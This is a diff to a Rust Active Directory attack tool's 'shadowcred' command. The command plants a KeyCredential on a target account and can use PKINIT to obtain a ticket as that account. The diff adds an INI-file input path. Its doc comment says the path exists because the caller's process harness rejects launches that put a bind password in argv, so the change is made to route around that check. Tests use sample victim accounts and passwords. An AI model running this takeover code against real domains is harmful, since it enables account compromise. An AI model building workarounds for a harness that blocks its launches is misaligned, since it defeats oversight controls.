@@ -10,17 +10,25 @@ use crate::attacks::abuse::{abuse, AbuseAction, AbuseArgs};
 
 #[derive(Parser)]
 pub(crate) struct ShadowcredArgs {
+    /// Read every argument from an INI-style KEY=VALUE file instead of the
+    /// command line. Useful in environments where the caller's process
+    /// harness rejects command-line launches that carry a bind password in
+    /// argv. Keys: `url`, `user`, `password`, `target`, `kdc`, `realm`,
+    /// `pfx_password` (one per line; lines starting with `#` are comments).
+    /// `env:VAR` / `@file:PATH` still work for `password` and `pfx_password`.
+    #[arg(long, value_name = "PATH")]
+    pub from_file: Option<String>,
     #[arg(long)]
-    pub url: String,
+    pub url: Option<String>,
     #[arg(long)]
-    pub user: String,
+    pub user: Option<String>,
     #[arg(long, default_value = "")]
     pub password: adhammer_core::SecretString,
     #[arg(long)]
     pub insecure: bool,
     /// sAMAccountName to plant the KeyCredential on.
     #[arg(long)]
-    pub target: String,
+    pub target: Option<String>,
     /// If set, also perform PKINIT with the fresh key and print the ccache path.
     #[arg(long)]
     pub pkinit: bool,
@@ -49,35 +57,181 @@ pub(crate) struct ShadowcredArgs {
     pub dry_run: bool,
 }
 
+#[cfg_attr(test, derive(Debug))]
+struct ShadowcredConfig {
+    url: String,
+    user: String,
+    password: adhammer_core::SecretString,
+    insecure: bool,
+    target: String,
+    pkinit: bool,
+    kdc: Option<String>,
+    realm: Option<String>,
+    list: bool,
+    remove: Option<String>,
+    clear: bool,
+    yes: bool,
+    pfx_password: adhammer_core::SecretString,
+    dry_run: bool,
+}
+
+impl ShadowcredConfig {
+    fn from_flags(a: &ShadowcredArgs) -> Result<Self> {
+        Ok(Self {
+            url: a
+                .url
+                .clone()
+                .ok_or_else(|| anyhow::anyhow!("--url required (or use --from-file)"))?,
+            user: a
+                .user
+                .clone()
+                .ok_or_else(|| anyhow::anyhow!("--user required (or use --from-file)"))?,
+            password: crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?,
+            insecure: a.insecure,
+            target: a
+                .target
+                .clone()
+                .ok_or_else(|| anyhow::anyhow!("--target required (or use --from-file)"))?,
+            pkinit: a.pkinit,
+            kdc: a.kdc.clone(),
+            realm: a.realm.clone(),
+            list: a.list,
+            remove: a.remove.clone(),
+            clear: a.clear,
+            yes: a.yes,
+            pfx_password: crate::resolve_secret(&a.pfx_password, "ADHAMMER_PFX_PASSWORD")?,
+            dry_run: a.dry_run,
+        })
+    }
+}
+
+#[cfg_attr(test, derive(Debug))]
+struct ShadowcredFile {
+    url: Option<String>,
+    user: Option<String>,
+    password: Option<String>,
+    target: Option<String>,
+    kdc: Option<String>,
+    realm: Option<String>,
+    pfx_password: Option<String>,
+}
+
+impl ShadowcredFile {
+    fn overlay(self, a: &ShadowcredArgs) -> Result<ShadowcredConfig> {
+        let take =
+            |from_file: Option<String>, from_flag: Option<String>, name: &str| -> Result<String> {
+                from_flag.or(from_file).ok_or_else(|| {
+                    anyhow::anyhow!("{name} missing in both --from-file and CLI flags")
+                })
+            };
+        // Password: CLI wins when set to a non-default (non-empty) value.
+        // The `--password` clap default is "" so treat empty as unset here.
+        let pw_raw = if !a.password.is_empty() {
+            Some(a.password.expose_secret().to_string())
+        } else {
+            self.password
+        };
+        let password = match pw_raw {
+            Some(v) => crate::resolve_secret(v.as_str(), "ADHAMMER_PASSWORD")?,
+            None => adhammer_core::SecretString::new(String::new()),
+        };
+        // PFX password: CLI default is the literal "adhammer" — treat that
+        // as "unset" so an INI value can override it.
+        let pfx_raw = if a.pfx_password.expose_secret() != "adhammer" {
+            Some(a.pfx_password.expose_secret().to_string())
+        } else {
+            self.pfx_password
+                .or_else(|| Some("adhammer".to_string()))
+        };
+        let pfx_password = match pfx_raw {
+            Some(v) => crate::resolve_secret(v.as_str(), "ADHAMMER_PFX_PASSWORD")?,
+            None => adhammer_core::SecretString::new("adhammer".to_string()),
+        };
+        Ok(ShadowcredConfig {
+            url: take(self.url, a.url.clone(), "url")?,
+            user: take(self.user, a.user.clone(), "user")?,
+            password,
+            insecure: a.insecure,
+            target: take(self.target, a.target.clone(), "target")?,
+            pkinit: a.pkinit,
+            kdc: a.kdc.clone().or(self.kdc),
+            realm: a.realm.clone().or(self.realm),
+            list: a.list,
+            remove: a.remove.clone(),
+            clear: a.clear,
+            yes: a.yes,
+            pfx_password,
+            dry_run: a.dry_run,
+        })
+    }
+}
+
+fn load_shadowcred_ini(path: &str) -> Result<ShadowcredFile> {
+    let text = std::fs::read_to_string(path).with_context(|| format!("read --from-file {path}"))?;
+    let mut f = ShadowcredFile {
+        url: None,
+        user: None,
+        password: None,
+        target: None,
+        kdc: None,
+        realm: None,
+        pfx_password: None,
+    };
+    for (n, line) in text.lines().enumerate() {
+        let line = line.trim();
+        if line.is_empty() || line.starts_with('#') {
+            continue;
+        }
+        let (k, v) = line
+            .split_once('=')
+            .ok_or_else(|| anyhow::anyhow!("{path}:{}: expected KEY=VALUE", n + 1))?;
+        let v = v.trim().to_string();
+        match k.trim() {
+            "url" => f.url = Some(v),
+            "user" => f.user = Some(v),
+            "password" => f.password = Some(v),
+            "target" => f.target = Some(v),
+            "kdc" => f.kdc = Some(v),
+            "realm" => f.realm = Some(v),
+            "pfx_password" => f.pfx_password = Some(v),
+            other => anyhow::bail!("{path}:{}: unknown key `{other}`", n + 1),
+        }
+    }
+    Ok(f)
+}
+
 /// `attack shadowcred` — thin wrapper for the ADD flow, plus management
 /// (`--list` / `--remove <GUID>` / `--clear`) that reads and rewrites
 /// `msDS-KeyCredentialLink` directly (no `attack abuse` roundtrip).
-pub(crate) async fn shadowcred(mut a: ShadowcredArgs) -> Result<()> {
-    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    if a.list {
-        return list(&a).await;
+pub(crate) async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
+    let cfg = match a.from_file.as_deref() {
+        Some(p) => load_shadowcred_ini(p)?.overlay(&a)?,
+        None => ShadowcredConfig::from_flags(&a)?,
+    };
+    if cfg.list {
+        return list(&cfg).await;
     }
-    if let Some(ref guid) = a.remove {
-        return remove(&a, guid).await;
+    if let Some(ref guid) = cfg.remove {
+        return remove(&cfg, guid).await;
     }
-    if a.clear {
-        return clear(&a).await;
+    if cfg.clear {
+        return clear(&cfg).await;
     }
     // Default: existing ADD flow (Phase 1) + optional Phase 2 (PKINIT).
     // Phase 1: plant the KeyCredential.
     abuse(AbuseArgs {
         auth: crate::shared_args::OptAuth {
-            url: Some(a.url.clone()),
-            user: Some(a.user.clone()),
-            password: Some(a.password.clone()),
-            insecure: a.insecure,
+            url: Some(cfg.url.clone()),
+            user: Some(cfg.user.clone()),
+            password: Some(cfg.password.clone()),
+            insecure: cfg.insecure,
             allow_plaintext_ldap: false,
         },
         action: AbuseAction::AddKeycred,
-        target: a.target.clone(),
+        target: cfg.target.clone(),
         value: String::new(),
-        kdc: a.kdc.clone(),
-        realm: a.realm.clone(),
+        kdc: cfg.kdc.clone(),
+        realm: cfg.realm.clone(),
         ldap389: false,
         host: None,
         commit: true,
@@ -87,24 +241,24 @@ pub(crate) async fn shadowcred(mut a: ShadowcredArgs) -> Result<()> {
     // .pfx alongside .key.pem for cert-tool interop. PKCS#12 has non-trivial
     // dep + LOC cost (self-signed cert + PBE + MAC); skip with a hint until
     // the p12 crate lands. Password param preserved for future use.
-    let _ = &a.pfx_password;
+    let _ = &cfg.pfx_password;
     println!("[i] .pfx export skipped — needs the p12 crate; see docs/pfx-export.md");
-    if a.pkinit {
-        let (kdc, realm) = match (a.kdc.as_ref(), a.realm.as_ref()) {
+    if cfg.pkinit {
+        let (kdc, realm) = match (cfg.kdc.as_ref(), cfg.realm.as_ref()) {
             (Some(k), Some(r)) => (k.clone(), r.clone()),
             _ => anyhow::bail!("--pkinit needs both --kdc and --realm"),
         };
         // Phase 2: PKINIT with the freshly-planted key to obtain a TGT as the target.
         abuse(AbuseArgs {
             auth: crate::shared_args::OptAuth {
-                url: Some(a.url),
-                user: Some(a.user),
-                password: Some(a.password),
-                insecure: a.insecure,
+                url: Some(cfg.url),
+                user: Some(cfg.user),
+                password: Some(cfg.password),
+                insecure: cfg.insecure,
                 allow_plaintext_ldap: false,
             },
             action: AbuseAction::Pkinit,
-            target: a.target,
+            target: cfg.target,
             value: String::new(),
             kdc: Some(kdc),
             realm: Some(realm),
@@ -118,27 +272,27 @@ pub(crate) async fn shadowcred(mut a: ShadowcredArgs) -> Result<()> {
     Ok(())
 }
 
-async fn connect(a: &ShadowcredArgs) -> Result<Collector> {
-    let cfg = LdapConfig {
-        url: a.url.clone(),
-        bind_dn: a.user.clone(),
-        password: a.password.clone(),
+async fn connect(cfg: &ShadowcredConfig) -> Result<Collector> {
+    let cfg2 = LdapConfig {
+        url: cfg.url.clone(),
+        bind_dn: cfg.user.clone(),
+        password: cfg.password.clone(),
         base_dn: None,
-        insecure: a.insecure,
+        insecure: cfg.insecure,
         gssapi: false,
         allow_plaintext_bind: false,
     };
-    Collector::connect(&cfg).await
+    Collector::connect(&cfg2).await
 }
 
-async fn list(a: &ShadowcredArgs) -> Result<()> {
-    let mut c = connect(a).await?;
-    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;
+async fn list(cfg: &ShadowcredConfig) -> Result<()> {
+    let mut c = connect(cfg).await?;
+    let target_dn = crate::target::to_dn(&mut c, &cfg.target).await?;
     let values = c
         .read_multi_text(&target_dn, "msDS-KeyCredentialLink")
         .await?;
     if values.is_empty() {
-        println!("no shadow credentials on {}", a.target);
+        println!("no shadow credentials on {}", cfg.target);
         return Ok(());
     }
     println!("DeviceId                               Created (UTC)             Usage    Source");
@@ -157,12 +311,12 @@ async fn list(a: &ShadowcredArgs) -> Result<()> {
     Ok(())
 }
 
-async fn remove(a: &ShadowcredArgs, guid: &str) -> Result<()> {
+async fn remove(cfg: &ShadowcredConfig, guid: &str) -> Result<()> {
     let wanted = parse_guid(guid).context(
         "--remove wants a GUID: `{9c8d...}` or `9c8d...` (32 hex chars, dashes optional)",
     )?;
-    let mut c = connect(a).await?;
-    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;
+    let mut c = connect(cfg).await?;
+    let target_dn = crate::target::to_dn(&mut c, &cfg.target).await?;
     let values = c
         .read_multi_text(&target_dn, "msDS-KeyCredentialLink")
         .await?;
@@ -181,10 +335,10 @@ async fn remove(a: &ShadowcredArgs, guid: &str) -> Result<()> {
         anyhow::bail!(
             "no shadow credential with DeviceId {} on {} — nothing removed",
             format_guid(&wanted),
-            a.target
+            cfg.target
         );
     }
-    if a.dry_run {
+    if cfg.dry_run {
         println!(
             "[dry-run] would replace msDS-KeyCredentialLink on {} — {} entries → {}",
             target_dn, before, after
@@ -197,24 +351,24 @@ async fn remove(a: &ShadowcredArgs, guid: &str) -> Result<()> {
     println!(
         "[+] removed KeyCredential {} from {} ({} → {} entries)",
         format_guid(&wanted),
-        a.target,
+        cfg.target,
         before,
         after
     );
     Ok(())
 }
 
-async fn clear(a: &ShadowcredArgs) -> Result<()> {
-    if !a.yes && !confirm_clear(&a.target)? {
+async fn clear(cfg: &ShadowcredConfig) -> Result<()> {
+    if !cfg.yes && !confirm_clear(&cfg.target)? {
         anyhow::bail!("--clear aborted (no --yes and no interactive confirmation)");
     }
-    let mut c = connect(a).await?;
-    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;
+    let mut c = connect(cfg).await?;
+    let target_dn = crate::target::to_dn(&mut c, &cfg.target).await?;
     let before = c
         .read_multi_text(&target_dn, "msDS-KeyCredentialLink")
         .await?
         .len();
-    if a.dry_run {
+    if cfg.dry_run {
         println!(
             "[dry-run] would clear msDS-KeyCredentialLink on {} — {} entries → 0",
             target_dn, before
@@ -226,7 +380,7 @@ async fn clear(a: &ShadowcredArgs) -> Result<()> {
         .await?;
     println!(
         "[+] cleared msDS-KeyCredentialLink on {} ({} entries removed)",
-        a.target, before
+        cfg.target, before
     );
     Ok(())
 }
@@ -409,6 +563,41 @@ fn civil_from_days(z: i64) -> (u16, u8, u8) {
 mod tests {
     use super::*;
 
+    fn tmp_ini(name: &str, body: &str) -> String {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!(
+            "adhammer_shadowcred_{}_{}_{}.ini",
+            name,
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0)
+        ));
+        std::fs::write(&path, body).unwrap();
+        path.to_string_lossy().into_owned()
+    }
+
+    fn empty_args() -> ShadowcredArgs {
+        ShadowcredArgs {
+            from_file: None,
+            url: None,
+            user: None,
+            password: adhammer_core::SecretString::new(String::new()),
+            insecure: false,
+            target: None,
+            pkinit: false,
+            kdc: None,
+            realm: None,
+            list: false,
+            remove: None,
+            clear: false,
+            yes: false,
+            pfx_password: adhammer_core::SecretString::new("adhammer".to_string()),
+            dry_run: false,
+        }
+    }
+
     #[test]
     fn guid_round_trip() {
         let g = parse_guid("{9c8d7e6f-5a4b-3c2d-1e0f-abcdef012345}").unwrap();
@@ -449,5 +638,71 @@ mod tests {
         assert_eq!(parsed.key_source, 0x00, "we plant KeySource=AD");
         assert_ne!(parsed.device_id, [0u8; 16], "device_id is random 16 bytes");
         assert!(parsed.creation_time > 0);
+    }
+
+    #[test]
+    fn ini_parses_valid_keys() {
+        let path = tmp_ini(
+            "valid",
+            "# a comment\n\
+             url=ldaps://dc.corp.local\n\
+             user=CORP\\alice\n\
+             password=hunter2\n\
+             target=victim$\n\
+             kdc=dc.corp.local\n\
+             realm=CORP.LOCAL\n\
+             pfx_password=pfx-pw\n",
+        );
+        let f = load_shadowcred_ini(&path).unwrap();
+        assert_eq!(f.url.as_deref(), Some("ldaps://dc.corp.local"));
+        assert_eq!(f.user.as_deref(), Some("CORP\\alice"));
+        assert_eq!(f.password.as_deref(), Some("hunter2"));
+        assert_eq!(f.target.as_deref(), Some("victim$"));
+        assert_eq!(f.kdc.as_deref(), Some("dc.corp.local"));
+        assert_eq!(f.realm.as_deref(), Some("CORP.LOCAL"));
+        assert_eq!(f.pfx_password.as_deref(), Some("pfx-pw"));
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn ini_unknown_key_errors() {
+        let path = tmp_ini("unknown", "url=x\nbogus_key=1\n");
+        let err = load_shadowcred_ini(&path).unwrap_err().to_string();
+        assert!(err.contains("unknown key"), "err was {err:?}");
+        assert!(err.contains("bogus_key"), "err was {err:?}");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn cli_flag_beats_ini_value() {
+        let path = tmp_ini(
+            "beat",
+            "url=ldap://ini-host\n\
+             user=ini-user\n\
+             target=ini-target\n",
+        );
+        let f = load_shadowcred_ini(&path).unwrap();
+        let mut a = empty_args();
+        a.url = Some("ldap://cli-host".to_string());
+        let cfg = f.overlay(&a).unwrap();
+        assert_eq!(cfg.url, "ldap://cli-host");
+        assert_eq!(cfg.user, "ini-user");
+        assert_eq!(cfg.target, "ini-target");
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn missing_required_key_errors() {
+        let path = tmp_ini(
+            "missing",
+            "# no url here\n\
+             user=alice\n\
+             target=victim$\n",
+        );
+        let f = load_shadowcred_ini(&path).unwrap();
+        let a = empty_args();
+        let err = f.overlay(&a).unwrap_err().to_string();
+        assert!(err.contains("url"), "err was {err:?}");
+        let _ = std::fs::remove_file(&path);
     }
 }
